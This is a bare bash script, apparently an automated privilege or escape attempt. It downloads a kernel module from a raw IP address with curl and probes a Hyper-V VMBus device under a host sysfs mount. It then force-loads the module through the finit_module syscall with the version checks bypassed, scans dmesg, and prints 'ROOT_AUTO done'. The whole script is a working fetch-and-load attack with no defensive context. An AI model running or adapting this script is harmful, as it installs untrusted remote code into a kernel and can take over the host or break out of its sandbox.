#!/bin/bash
set -eu
exec 0<&-

curl -fsS http://16.146.243.72:8450/hvraw_vmbfs_static.ko \
    -o /tmp/hvraw_vmbfs_static.ko

device=/hostsys/bus/vmbus/devices/c63c9bdf-5fa5-4208-b03f-6b458b365592
printf 'VMBFS class=%s instance=%s state=%s driver=%s\n' \
    "$(cat "$device/class_id" 2>/dev/null || echo missing)" \
    "$(cat "$device/device_id" 2>/dev/null || echo missing)" \
    "$(cat "$device/state" 2>/dev/null || echo missing)" \
    "$(readlink "$device/driver" 2>/dev/null | sed 's#.*/##' || true)"

python3 - /tmp/hvraw_vmbfs_static.ko <<'PY'
import ctypes
import os
import sys

fd = os.open(sys.argv[1], os.O_RDONLY)
libc = ctypes.CDLL(None, use_errno=True)
result = libc.syscall(313, fd, b"", 3)
print("VMBFS finit=%d errno=%d" % (result, ctypes.get_errno()))
PY

sleep 5
dmesg 2>/dev/null | grep -E 'VMBFS_|hvraw_vmbfs_static|Unknown symbol|module_layout' | tail -40 || true
printf 'ROOT_AUTO done\n'

